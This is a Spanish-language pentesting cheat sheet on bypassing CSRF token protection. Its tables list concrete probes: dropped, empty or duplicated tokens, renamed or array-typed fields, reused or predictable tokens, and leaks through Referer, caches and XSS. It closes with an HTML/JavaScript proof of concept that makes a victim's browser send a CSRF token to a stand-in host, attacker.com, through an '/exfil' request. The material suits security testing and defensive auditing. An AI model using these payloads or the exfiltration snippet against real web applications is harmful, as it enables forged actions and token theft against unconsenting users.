---
aliases:
  - CSRF Token Bypass
  - Synchronizer Token Bypass
tags:
  - type/cheatsheet
  - vuln/csrf
  - technique/defense-evasion
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Cross-Site Request Forgery (CSRF)]]'
---
# CSRF - Bypass de Token

***

## Token No Validado (Remove)

|         **Objetivo**         |                                    **Probe**                                     |                      **Notas**                      |
| :--------------------------: | :------------------------------------------------------------------------------: | :-------------------------------------------------: |
| Eliminar token completamente |                          Submit sin field `csrf_token`                           | Backend que solo valida si presente → bypass total. |
|     Eliminar header CSRF     |                             `X-CSRF-Token` removido                              |             Mismo concepto en headers.              |
|         Empty token          |                           `csrf_token=` (string vacío)                           |            Algunos comparan con == laxo.            |
|          Token NULL          |                                `csrf_token=null`                                 |               String literal "null".                |
|       Token undefined        |                              Sin field en absoluto                               |                 Diferente de empty.                 |
|    Header con valor vacío    |                                 `X-CSRF-Token: `                                 |       Trailing space — algunos parsers strip.       |
|     Token con whitespace     |                                  `csrf_token= `                                  |                  Otros normalizan.                  |
|       Múltiples fields       | `<input name="csrf_token" value="">` + `<input name="csrf_token" value="legit">` |            Server toma primero o último.            |
|     Cookie sí, header no     |                      Si solo cookie tiene token, no header                       |           Double-submit con backend laxo.           |
|        GET con params        |                     Convertir POST a GET con params del body                     |          Algunos endpoints aceptan ambos.           |
^csrf-bypass-token-remove

___

## Token Validado Solo Si Presente

| **Objetivo** | **Probe** | **Notas** |
|:---:|:---:|:---:|
| Test pattern | Backend solo valida token si campo `csrf_token` existe en body | Anti-pattern frecuente. |
| Bypass via name change | Renombrar `csrf_token` a `csrftoken` o `_token` | Si validador hardcodea name exacto. |
| Bypass via case | `CSRF_Token`, `Csrf_Token` | Header case-insensitive, body case-sensitive — varía. |
| Bypass via array param | `csrf_token[]=valid` (array) | PHP / parsers laxos lo tratan distinto. |
| Bypass via JSON object | `{"csrf_token":{"value":"..."}}` | Type confusion en parser. |
| Bypass via duplicate | `csrf_token=garbage&csrf_token=` | Server toma uno u otro. |
| Header en lugar de field | Cuando endpoint acepta ambos | Mover token a `X-CSRF-Token` legítimo + omitir field. |
| Token presente con value invalid | `csrf_token=AAAAAAAA` | Solo valida presencia, no contenido. |
| Token con prefijo/sufijo | `csrf_token=valid_token_+ extra` | String concat tolerado. |
| Test sin contenido | `csrf_token=null` o `csrf_token=undefined` | Type juggling. |
^csrf-bypass-token-presence

___

## Token Reuse / Fixed Value

| **Objetivo** | **Probe** | **Notas** |
|:---:|:---:|:---:|
| Reutilizar token de sesión propia | Capturar token + usar en sesión víctima | Si token no tied to user. |
| Token estático | Token igual entre sesiones | Anti-pattern severo. |
| Token tied a IP solo | Cambiar IP → token inválido, mantener IP → siempre OK | Si attacker e victim misma IP. |
| Token reutilizable indefinidamente | Sin expiration | Capture once, use forever. |
| Login CSRF luego reuse | Login attacker → robar token → usar contra victim | Auth context. |
| Token predecible | Counter / timestamp / uuid v1 | Predicción matemática. |
| Token con MD5/SHA1 weak | Hash de cosa conocida | Reverse engineering. |
| Token derivado de session ID | `token = sha256(session_id)` | Session leak → token leak. |
| Default token "test" | Algunas apps tienen token "default" | Lookup en source / docs. |
| Token in URL leakeado | `Referer` header → token a 3rd party | Logs externos. |
^csrf-bypass-token-reuse

___

## Token Tied to Non-Session

| **Objetivo** | **Probe** | **Notas** |
|:---:|:---:|:---:|
| Tied a IP sólo | Misma IP, distinto user → mismo token válido | Compartir Wi-Fi público. |
| Tied a user-agent | Token válido si UA igual | Trivial replicar. |
| Tied a User-ID estático | Token = function(user_id) sin session secret | Leak user_id → forge. |
| Tied a timestamp redondeado | Token solo cambia cada hora | Window grande. |
| Tied to nothing | Token random pero compartido entre users | Pool global. |
| Login CSRF → ATO | Login con creds atacante → robar token → switch session víctima | Multi-step. |
| Cookie de token detached | Cookie `csrf=...` no link a session cookie | Subdomain takeover steal. |
| Token cifrado pero key leaked | Pública / hardcoded key en JS frontend | Forge desde cliente. |
| HMAC con secret leaked | Secret en repo público | Universal forge. |
| Backend valida solo origen del cliente vía cookie | Atacante con misma cookie cs root domain | Subdomain abuse. |
^csrf-bypass-token-tied

___

## Token Leak (Referer / URL)

| **Objetivo** | **Probe** | **Notas** |
|:---:|:---:|:---:|
| Token en URL GET | `https://target/action?csrf=ABC123&...` | Logueado en server logs, browser history, Referer header. |
| Leak via Referer cross-origin | Embed `<img src="http://attacker/log">` en página con token en URL → atacante recibe Referer | Vector clásico. |
| Leak via window.location | JS hostil con `parent.location.search` | Iframe scenarios. |
| Leak via 3rd-party script | Tag manager, analytics — script external recibe URL | Risk de supply chain. |
| Token en HTML cacheado | Public CDN / proxy guarda response con token | Attacker reads cache. |
| Token en comments JS | `// CSRF: ABC123` en código frontend | Source disclosure. |
| Token en `<meta>` accesible | `<meta name="csrf-token" content="...">` | Cross-frame access via window.frames. |
| Local storage / Session storage | `localStorage.getItem('csrf_token')` desde XSS | XSS chain. |
| Token en error pages | 404 / 500 con token reflejado | Crawled. |
| Token via XSS reflejado | XSS leak token al atacante | Combo. |
^csrf-bypass-token-leak

### Referer leak PoC

```html
<!-- Atacante hostea esto en attacker.com -->
<!-- Victim visita https://target.com/transfer?csrf=ABC123 -->
<!-- Cuando víctima ve esto, navegador manda Referer al atacante -->
<img src="https://attacker.com/log" id="img">
<script>
  document.getElementById('img').onload = () => {
    // Server logs reciben header: Referer: https://target.com/transfer?csrf=ABC123
    fetch('/exfil?ref='+document.referrer);
  };
</script>
```

***
